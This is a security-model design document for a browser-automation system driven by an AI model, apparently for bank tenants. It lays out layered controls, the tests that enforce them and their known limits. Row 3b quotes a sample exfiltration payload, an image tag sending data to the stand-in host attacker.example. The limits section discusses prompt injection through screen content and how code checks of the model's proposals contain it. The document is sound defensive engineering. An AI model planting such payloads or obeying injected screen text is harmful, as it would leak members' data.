# Security model

Terms in [CONTEXT.md](./CONTEXT.md). The principle: arrange things so the dangerous action is *impossible*, not merely disallowed — a model that ignores an instruction must still hit a wall made of code, configuration or someone else's system.

## Layers, strongest first

| # | Control | Where it lives | Status |
|---|---|---|---|
| 1 | **BUILT** — **Least-privilege Service Account.** The login used for a capability holds the narrowest role it needs; a read-only capability signs in as a user with no Transfer menu at all. Even a fully compromised automation cannot move money. | the Tenant's app | `fake_bank/data.py`, `cua/secrets.py` (EnvSecrets per service account) |
| 2 | **BUILT** — **Capability by construction.** The Replay Engine implements a closed action vocabulary; `download`, `execute_script`, `open_new_tab` have no implementation, so no Artifact can express them. | `cua/domain/artifact.py` closed vocabularies |
| 3 | **BUILT** — **Browser hardening.** Downloads off, popups and new tabs closed and logged, file chooser disabled, permissions denied, JS dialogs dismissed, a fresh context per run so no cookie crosses Tenants. | `cua/surface/driver.py` |
| 3b | **BUILT** — **Route interception.** Every request the browser makes — including ones the page starts by itself (images, scripts, redirects) — is checked against the allowlisted origins and aborted if it fails. This is what stops data leaving via a planted `<img src="https://attacker.example/?data=…">` in a member notes field, which a check-before-we-act rule cannot see. | `cua/surface/driver.py` `_gate` |
| 4 | **Network isolation.** The browser can reach only that Tenant's origins (container egress allowlist or proxy). Off-domain navigation fails at the network, not at an `if`. Also the real defence against exfiltration via a planted link. | deployment | Design only, not built |
| 5 | **Credential separation by phase.** The discovery process cannot see production secrets at all — different namespace, different service account. "Discovery can't touch production" becomes a fact, not a flag. | deployment | Design only, not built |
| 6 | **Two-Person Approval** for any Artifact containing a Consequential Action. Mirrors bank change control. | artifact + check | **TO BUILD** — simplified |
| 7 | **Tamper-evident Evidence.** Append-only JSONL with a hash chain; a run's history cannot be quietly rewritten. This is what makes an `Outcome Unknown` verdict trustworthy. | evidence sink | Design only, not built |
| 8 | **BUILT** — **Policy layering.** Baseline ∩ Tenant ∩ Needs, checked before every action. | `cua/governance/policy.py`, `config/baseline.yaml`, `config/policies/*` |
| 9 | **BUILT** — **Secrets by reference.** Substituted at the moment of typing, below the model, below the log, below the Artifact. | `cua/replay/engine.py` |
| 10 | **BUILT** — **Redaction Chokepoint**, both inbound (logs, evidence, artifacts, returned outputs) and outbound (observation text before it reaches a model, and the screenshot: declared Sensitive Regions, every value cell not declared readable, and declared text patterns painted black at capture). | `cua/evidence/redact.py`, `Surface.screenshot` |

Rows marked BUILT are implemented and covered by a test in `tests/app/governance/test_policy.py`. The rest are decisions, not claims about the code.

## Tests that are controls

All of these pass today except the two marked (todo).

- Replay code cannot import the model SDK (import-graph test).
- An Artifact naming an action outside the vocabulary is rejected by the schema.
- An Artifact whose Needs exceed the Policy is Refused before the browser opens.
- A capability whose Role the Tenant has not granted is Refused, naming the layer that refused.
- A request to another origin is aborted inside the browser, including one the page starts itself.
- A Tenant Overlay that adds a Transition, changes the Contract or widens Needs is rejected.
- A redaction canary value never appears in any evidence file, log line or screenshot.
- A Business Outcome is never retried.
- Every policy decision is recorded in the evidence.
- Automation and Operator cannot hold control at the same time. (todo: step 8)

## Known limits (state these plainly in REPORT.md)

- **Route keyword deny-lists are weak.** A bank may call transfers "Funds Movement". Keywords are a second net under the Tenant's route allowlist, never the primary defence.
- **Screenshots can capture what redaction misses.** Text redaction does not clean pixels, so the image is masked at capture, with the same default-deny as text: every value cell whose caption is not a Readable Anchor is painted black, plus declared Sensitive Regions (by Target) and declared text patterns (a member number in a heading). Controls are never painted — the model must see what it acts on — so a value rendered *inside* a control, or free text that matches no pattern and sits in no cell, can still reach the image; that is the residual risk, and why discovery runs against Non-production Environments only. Target crops (the picture rung) are taken before acting and only for clicks, so no crop is a picture of a value. Failure screenshots in Replay pass through the same mask; what remains is encrypted, short retention, access-controlled.
- **Prompt injection is mitigated, not solved.** Screen content is treated as data and the model is told so, but the actual protection is that the model only *proposes* and every action is checked by code. A convincing injection can still waste a discovery run.
- **Two-person approval is only as good as the identities behind it**; the demo has no real identity system.
- **All Playwright calls live in one Surface module**, asserted by a test, so no other code can reach the browser directly and bypass the policy wrapper. The action vocabulary has no member mapping to `evaluate`, so an Artifact cannot request arbitrary script execution.
